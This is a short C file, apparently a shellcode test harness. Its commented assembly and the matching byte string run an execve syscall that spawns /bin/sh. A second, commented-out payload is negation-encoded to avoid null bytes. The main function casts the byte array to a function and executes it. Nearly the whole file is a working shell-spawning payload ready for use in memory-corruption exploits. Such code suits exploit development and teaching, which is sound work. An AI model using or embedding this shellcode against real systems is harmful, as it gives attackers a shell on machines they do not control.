/*
global _start
section .text
_start:
	push 59
	pop rax
	cdq
	push rdx
	mov rbx,0x68732f6e69622f2f
	push rbx
	push rsp
	pop rdi
	push rdx
	push rdi
	push rsp
	pop rsi
	syscall
*/

#include <stdio.h>
#include <string.h>
char code[] = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05";
// char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
int main()
{
    printf("len:%d bytes\n", strlen(code));
    (*(void(*)()) code)();
    return 0;
}